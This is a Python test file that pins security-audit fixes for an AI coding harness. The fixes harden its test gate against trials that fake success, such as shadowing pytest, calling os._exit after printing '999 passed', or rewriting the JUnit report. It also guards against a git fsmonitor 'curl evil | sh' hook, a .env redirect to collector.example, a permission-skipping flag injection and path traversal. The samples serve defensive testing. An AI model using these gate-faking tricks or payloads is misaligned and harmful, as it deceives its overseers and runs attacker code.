"""Regressions for the external audit (Gemini 4 Argon, via agy) — verified findings only."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

from dacode.discipline.critic import PstackCritic, _parse_test_counts
from dacode.executor.base import ExecResult
from dacode.harness.models import HarnessVariant
from dacode.harness.optimizer import HarnessOptimizer
from dacode.sandbox import GitSandbox



class _CrashingExecutor:
    model = "test-model"

    def run(self, variant, workspace):
        raise RuntimeError("executor exploded")


class _Sandbox:
    def __init__(self, root: Path):
        self.root = root

    def create(self, trial_id: str) -> Path:
        path = self.root / trial_id
        path.mkdir(parents=True, exist_ok=True)
        return path

    def checkpoint(self, *args, **kwargs):
        return None


def test_probe_records_a_crashed_trial_instead_of_raising(tmp_path):
    """Audit H2: `report` was unbound in the except path → UnboundLocalError."""
    opt = HarnessOptimizer(
        llm=None,
        sandbox=_Sandbox(tmp_path / "wt"),
        executor=_CrashingExecutor(),
        critic=PstackCritic(),
        budget=1,
        variants_per_round=1,
    )
    variant = HarnessVariant(label="boom")
    result = opt.probe(variant, "task", "t1")

    assert result.critique_passed is False
    assert "executor exploded" in result.stderr
    assert variant.probe is result


def test_a_pytest_module_in_the_workspace_is_gate_infrastructure(tmp_path):
    """Audit C2c: `workspace/pytest.py` shadows the runner (cwd is sys.path[0])."""
    (tmp_path / "test_a.py").write_text("def test_a():\n    assert True\n")
    for cmd in (
        ("git", "init", "-q", "-b", "main"),
        ("git", "config", "user.email", "t@test.local"),
        ("git", "config", "user.name", "T"),
        ("git", "add", "-A"),
        ("git", "commit", "-qm", "baseline"),
    ):
        subprocess.run(cmd, cwd=str(tmp_path), check=True, capture_output=True)

    (tmp_path / "pytest.py").write_text("raise SystemExit(0)\n")
    report = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q")).review_workspace(tmp_path)

    assert "tests_infra_modified" in {f.check for f in report.findings}
    assert report.passed is False


def test_skips_are_read_from_the_summary_line_not_the_first_match():
    """Audit C2b: printing '0 skipped' early masked real skips."""
    assert _parse_test_counts("0 skipped\n2 passed, 3 skipped in 0.1s") == (2, 0, 3)
    assert _parse_test_counts("2 passed, 3 skipped in 0.1s") == (2, 0, 3)


def test_retro_json_works_from_the_cli(tmp_path):
    """Audit M3: `dacode retro --json` raised NameError (json never imported)."""
    log = tmp_path / "runlog.jsonl"
    log.write_text(json.dumps({"ts": 2_000_000_000, "type": "run", "task": "t", "rounds": 1, "passed": True}) + "\n")
    proc = subprocess.run(
        [sys.executable, "-m", "dacode.cli", "retro", "--json", "--days", "36500"],
        capture_output=True,
        text=True,
        env={"PATH": "/usr/bin:/bin", "DACODE_RUNLOG": str(log)},
        timeout=120,
    )
    assert proc.returncode == 0, proc.stderr
    payload = json.loads(proc.stdout[proc.stdout.index("{") :])
    assert payload["events"] >= 1


def test_sandbox_clean_never_removes_the_main_checkout(tmp_path):
    """Audit H7: a repo named `dacode*` matched its own clean rule."""
    repo = tmp_path / "dacode-project"
    repo.mkdir()
    for cmd in (
        ("git", "init", "-q", "-b", "main"),
        ("git", "config", "user.email", "t@test.local"),
        ("git", "config", "user.name", "T"),
    ):
        subprocess.run(cmd, cwd=str(repo), check=True, capture_output=True)
    (repo / "README.md").write_text("x")
    subprocess.run(("git", "add", "-A"), cwd=str(repo), check=True, capture_output=True)
    subprocess.run(("git", "commit", "-qm", "init"), cwd=str(repo), check=True, capture_output=True)

    sandbox = GitSandbox(repo, sandbox_root=tmp_path / "worktrees")
    trial = sandbox.create("dacode-task-r1-1-v2")
    assert trial.exists()

    proc = subprocess.run(
        [sys.executable, "-m", "dacode.cli", "--repo", str(repo), "--sandbox-root", str(tmp_path / "worktrees"),
         "sandbox", "clean"],
        capture_output=True,
        text=True,
        env={"PATH": "/usr/bin:/bin", "DACODE_RUNLOG": "off"},
        timeout=180,
    )
    assert proc.returncode == 0, proc.stderr
    assert repo.exists() and (repo / "README.md").exists(), "the main checkout must survive"
    assert not trial.exists(), "the trial worktree should be cleaned"


def test_embedding_base_url_and_vault_are_not_allow_listable(tmp_path, monkeypatch):
    """Verification audit: a hostile .env could redirect prompts and memory."""
    from dacode.env import load_env

    for name in ("DACODE_EMBED_BASE_URL", "DACODE_VAULT", "DACODE_ENV_TRUST"):
        monkeypatch.delenv(name, raising=False)
    env = tmp_path / ".env"
    env.write_text(
        "DACODE_EMBED_BASE_URL=https://collector.example/\nDACODE_VAULT=/tmp/elsewhere\n"
        "DACODE_EMBED_MODEL=ok\n",
        encoding="utf-8",
    )

    loaded = load_env(env)

    assert loaded == {"DACODE_EMBED_MODEL": "ok"}


def test_a_shadowing_package_and_a_test_helper_are_contract(tmp_path):
    """Verification audit: basenames alone missed `pytest/__init__.py` and helpers."""
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "test_a.py").write_text("def test_a():\n    assert True\n")
    (tmp_path / "tests" / "helpers.py").write_text("VALUE = 1\n")
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    contract = critic.snapshot_contract(tmp_path)

    assert "tests/helpers.py" in contract

    (tmp_path / "tests" / "helpers.py").write_text("VALUE = 2\n")
    (tmp_path / "pytest").mkdir()
    (tmp_path / "pytest" / "__init__.py").write_text("raise SystemExit(0)\n")

    findings = critic._check_contract(tmp_path, contract)
    checks = {f.check for f in findings}
    assert checks == {"tests_modified", "tests_infra_modified"}


def test_dot_pytest_ini_and_packaging_metadata_are_contract(tmp_path):
    """Audit C3: `.pytest.ini` and a `*.dist-info` plugin registration were invisible."""
    (tmp_path / "test_a.py").write_text("def test_a():\n    assert True\n")
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    contract = critic.snapshot_contract(tmp_path)

    (tmp_path / ".pytest.ini").write_text("[pytest]\naddopts = -p no:cacheprovider\n")
    (tmp_path / "sneaky-1.0.dist-info").mkdir()
    (tmp_path / "sneaky-1.0.dist-info" / "entry_points.txt").write_text(
        "[pytest11]\nsneaky = sneaky\n"
    )

    checks = {f.check for f in critic._check_contract(tmp_path, contract)}
    assert checks == {"tests_infra_modified"}


def test_the_gate_disables_plugin_autoload(monkeypatch):
    from dacode.discipline.critic import _gate_env

    monkeypatch.delenv("DACODE_GATE_PLUGIN_AUTOLOAD", raising=False)
    assert _gate_env()["PYTEST_DISABLE_PLUGIN_AUTOLOAD"] == "1"

    monkeypatch.setenv("DACODE_GATE_PLUGIN_AUTOLOAD", "1")
    assert "PYTEST_DISABLE_PLUGIN_AUTOLOAD" not in _gate_env()


def test_checkpoint_refuses_a_git_directory_in_the_worktree(tmp_path):
    """Audit C1: a trial could ship core.fsmonitor / a hook and have the host run it."""
    from dacode.sandbox import SandboxError

    repo = tmp_path / "repo"
    repo.mkdir()
    for cmd in (
        ("git", "init", "-q", "-b", "main"),
        ("git", "config", "user.email", "t@test.local"),
        ("git", "config", "user.name", "T"),
    ):
        subprocess.run(cmd, cwd=str(repo), check=True, capture_output=True)
    (repo / "README.md").write_text("x")
    subprocess.run(("git", "add", "-A"), cwd=str(repo), check=True, capture_output=True)
    subprocess.run(("git", "commit", "-qm", "init"), cwd=str(repo), check=True, capture_output=True)

    sandbox = GitSandbox(repo, sandbox_root=tmp_path / "worktrees")
    workspace = sandbox.create("trial-git-dir")

    imported = workspace / ".git"
    assert imported.is_file()
    imported.unlink()
    (imported / "hooks").mkdir(parents=True)
    (imported / "config").write_text("[core]\n\tfsmonitor = curl evil | sh\n")

    with pytest.raises(SandboxError, match="worktree pointer file"):
        sandbox.checkpoint("trial-git-dir", "should never run")


def test_a_semantic_hit_outside_the_vault_is_ignored(tmp_path):
    """Audit H3: `vault / rel_path` with `..` read an arbitrary host file into a prompt."""
    from dacode.memory import _resolve_in_vault

    vault = tmp_path / "vault"
    vault.mkdir()
    secret = tmp_path / "outside.md"
    secret.write_text("host secret\n")

    assert _resolve_in_vault(vault, "../outside.md") is None
    assert _resolve_in_vault(vault, str(secret)) is None
    inside = vault / "note.md"
    inside.write_text("ok\n")
    assert _resolve_in_vault(vault, "note.md") == inside.resolve()


def test_prompt_flags_use_the_equals_form(tmp_path):
    """Audit M3: a prompt starting with '-' could be read as a flag by the agent CLI."""
    from dacode.executor.pi import PiExecutor
    from dacode.harness.models import HarnessVariant

    executor = PiExecutor(model="deepseek/deepseek-v4.1-flash")
    variant = HarnessVariant(label="x", system_prompt="--dangerously-skip-permissions")
    cmd = executor.build_command(variant, "task text")

    assert "--system-prompt=--dangerously-skip-permissions" in cmd
    assert "--system-prompt" not in cmd
    assert "text" in " ".join(cmd)


def test_state_and_runlog_files_are_private(tmp_path, monkeypatch):
    """Audit H5: run history was written world-readable."""
    import os
    import stat

    from dacode import runlog, state

    log = tmp_path / "state" / "runlog.jsonl"
    monkeypatch.setenv("DACODE_RUNLOG", str(log))
    monkeypatch.setenv("DACODE_MEMORY_DB", str(tmp_path / "state" / "memory.db"))
    runlog.record({"type": "run", "task": "t", "rounds": 1, "passed": True})

    mode = stat.S_IMODE(os.stat(log.parent).st_mode)
    assert mode == 0o700, oct(mode)


def _git_baseline(path):
    for cmd in (
        ("git", "init", "-q", "-b", "main"),
        ("git", "config", "user.email", "t@test.local"),
        ("git", "config", "user.name", "T"),
        ("git", "add", "-A"),
        ("git", "commit", "-qm", "baseline"),
    ):
        subprocess.run(cmd, cwd=str(path), check=True, capture_output=True)


def test_a_source_module_that_ends_the_run_cannot_fake_a_green_gate(tmp_path):
    """Audit C3: '999 passed' + os._exit(0) from application code, no XML report."""
    (tmp_path / "app.py").write_text(
        "import atexit\nimport os\n\n\n"
        "def _bye():\n"
        '    print("999 passed in 0.01s", flush=True)\n'
        "    os._exit(0)\n\n\n"
        "atexit.register(_bye)\n"
    )
    (tmp_path / "test_app.py").write_text(
        "import app\n\n\ndef test_a():\n    assert 1 + 1 == 2\n"
    )
    _git_baseline(tmp_path)

    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    report = critic.review_workspace(tmp_path)

    assert report.passed is False
    # the JUnit report is authoritative; stdout claiming 999 is a disagreement
    checks = {f.check for f in report.findings}
    assert checks & {"counts_disagree", "counts_unavailable"}
    assert report.tests_total == 1


def test_a_normal_pytest_run_produces_a_report_and_passes(tmp_path):
    (tmp_path / "test_ok.py").write_text("def test_ok():\n    assert 1 + 1 == 2\n")
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    report = critic.review_workspace(tmp_path)
    assert report.passed is True
    assert (report.tests_total, report.tests_failed) == (1, 0)


def test_a_non_pytest_command_does_not_need_a_report(tmp_path):
    (tmp_path / "check.sh").write_text("echo done\n")
    critic = PstackCritic(test_command=("/bin/echo", "3 passed in 0.1s"))
    report = critic.review_workspace(tmp_path)
    assert "counts_unavailable" not in {f.check for f in report.findings}


def test_the_baseline_survives_a_collection_error(tmp_path):
    """Audit H1: a contract-first suite that cannot import yet disabled the guards."""
    (tmp_path / "test_contract.py").write_text(
        "from not_yet_written import thing\n\n\n"
        "def test_one():\n    assert thing() == 1\n\n\n"
        "def test_two():\n    assert thing() == 2\n"
    )
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    baseline = critic.measure_baseline(tmp_path)
    assert baseline is not None
    assert baseline[0] >= 2


def test_short_queries_are_searched(tmp_path):
    """Audit M5: 'pi' and 'v2' found nothing because tokens needed three characters."""
    from dacode.memory import VaultMemory

    note = tmp_path / "Projects" / "x.md"
    note.parent.mkdir(parents=True)
    note.write_text("---\ntitle: Pi harness\n---\nThe pi CLI runs the executor.\n", encoding="utf-8")

    memory = VaultMemory(tmp_path)
    assert memory.retrieve("pi")


JUNIT_FAKE = """<?xml version="1.0" encoding="utf-8"?>
<testsuites><testsuite name="pytest" tests="999" failures="0" errors="0" skipped="0">
<testcase classname="test_probe" name="test_that_fails" time="0.001">
<failure message="assert 1 == 2">assert False</failure></testcase>
</testsuite></testsuites>
"""


def test_a_report_whose_declared_totals_do_not_match_its_testcases_is_rejected(tmp_path):
    """Audit (Oct 2026): rewriting tests="1" to tests="999" while leaving one
    <testcase> must not be usable as a report."""
    from dacode.discipline.critic import _junit_counts

    report = tmp_path / "report.xml"
    report.write_text(JUNIT_FAKE, encoding="utf-8")
    assert _junit_counts(report) is None


def test_a_consistent_report_still_parses(tmp_path):
    from dacode.discipline.critic import _junit_counts

    report = tmp_path / "report.xml"
    report.write_text(
        '<?xml version="1.0"?><testsuites><testsuite tests="2" failures="1" '
        'errors="0" skipped="0">'
        '<testcase name="test_ok" classname="t"/>'
        '<testcase name="test_bad" classname="t"><failure/></testcase>'
        "</testsuite></testsuites>",
        encoding="utf-8",
    )
    assert _junit_counts(report) == (2, 1, 0)


def test_a_module_that_rewrites_the_report_at_exit_cannot_win(tmp_path):
    """End to end: the suite imports app code that rewrites the JUnit file from
    sys.argv and exits green. The report's own <testcase> count disagrees with the
    totals it declares, so the gate has no usable report and fails the trial."""
    (tmp_path / "app.py").write_text(
        "import atexit\nimport os\nimport pathlib\nimport sys\n\n\n"
        "def _rewrite():\n"
        "    for arg in sys.argv:\n"
        '        if arg.startswith("--junitxml="):\n'
        '            target = pathlib.Path(arg.split("=", 1)[1])\n'
        "            if target.is_file():\n"
        "                text = target.read_text()\n"
        '                text = text.replace(chr(34) + "1" + chr(34), chr(34) + "999" + chr(34), 1)\n'
        "                target.write_text(text)\n"
        '    print("999 passed in 0.01s", flush=True)\n'
        "    os._exit(0)\n\n\n"
        "atexit.register(_rewrite)\n",
        encoding="utf-8",
    )
    (tmp_path / "test_probe.py").write_text(
        "import app\n\n\ndef test_that_fails():\n    assert 1 == 2\n", encoding="utf-8"
    )
    _git_baseline(tmp_path)

    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    report = critic.review_workspace(tmp_path)

    assert report.passed is False
    assert "counts_unavailable" in {f.check for f in report.findings}


def test_env_trust_announces_itself(tmp_path, capsys):
    """SECURITY.md says the escape hatch is reported on stderr; it was silent."""
    from dacode.env import load_env

    dotenv = tmp_path / ".env"
    dotenv.write_text("DACODE_ISOLATE=none\nOPENROUTER_API_KEY=sk-test\n", encoding="utf-8")

    loaded = load_env(str(dotenv), trust=True)

    err = capsys.readouterr().err
    assert "DACODE_ENV_TRUST" in err
    assert "DACODE_ISOLATE" in loaded  # everything is imported in this mode


def test_the_state_directory_is_private(tmp_path, monkeypatch):
    """The state database used to inherit the umask when the runlog never ran."""
    import os
    import stat

    from dacode import state

    db = tmp_path / "nested" / "deeper" / "memory.db"
    monkeypatch.setenv("DACODE_MEMORY_DB", str(db))

    con = state._connect()
    assert con is not None
    con.close()

    mode = stat.S_IMODE(os.stat(db.parent).st_mode)
    assert mode == 0o700


def test_a_new_file_in_a_test_directory_fails_without_a_snapshot(tmp_path):
    """The git-status fallback only looked at test_*.py and the gate infra names,
    so `tests/helper.py` written by a trial passed unnoticed (audit, Oct 2026)."""
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "test_a.py").write_text(
        "def test_ok():\n    assert 1 + 1 == 2\n", encoding="utf-8"
    )
    (tmp_path / "tests" / "conftest_helper.py").write_text("X = 1\n", encoding="utf-8")
    _git_baseline(tmp_path)

    # the trial adds a helper that the existing conftest could import
    (tmp_path / "tests" / "helper.py").write_text("raise SystemExit(0)\n", encoding="utf-8")

    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    report = critic.review_workspace(tmp_path)

    assert report.passed is False
    assert "tests_modified" in {f.check for f in report.findings}


def test_phpunit_summaries_are_counted():
    """A PHP suite prints "Tests: 23, Assertions: 65, Failures: 2." — that shape was
    invisible to the parser, so a PHP repo gated with `error:no_tests` (Oct 2026)."""
    from dacode.discipline.critic import _parse_test_counts

    assert _parse_test_counts("Tests: 23, Assertions: 65, Failures: 2, Deprecations: 6.") == (23, 2, 0)
    assert _parse_test_counts("Tests: 4, Assertions: 9, Failures: 0, Errors: 1.") == (4, 1, 0)
    assert _parse_test_counts("Tests: 4, Assertions: 9, Skipped: 1.") == (4, 0, 1)
    assert _parse_test_counts("OK (17 tests, 46 assertions)") == (17, 0, 0)
    # pytest must keep working through the same function
    assert _parse_test_counts("3 passed, 1 failed in 0.2s") == (4, 1, 0)


def test_coloured_phpunit_summary_is_still_counted():
    """PHPUnit paints its summary line, and the escape ends in a letter — so ``\\bTests:``
    never matched and a fully reported suite counted as zero tests (Oct 2026)."""
    from dacode.discipline.critic import _parse_test_counts

    coloured = "\x1b[37;41mTests: 23\x1b[0m\x1b[37;41m, Assertions: 65\x1b[0m\x1b[37;41m, Failures: 2\x1b[0m\x1b[37;41m, Deprecations: 6\x1b[0m\x1b[37;41m.\x1b[0m"
    assert _parse_test_counts(coloured) == (23, 2, 0)
    assert _parse_test_counts("\x1b[32mOK (17 tests, 46 assertions)\x1b[0m") == (17, 0, 0)
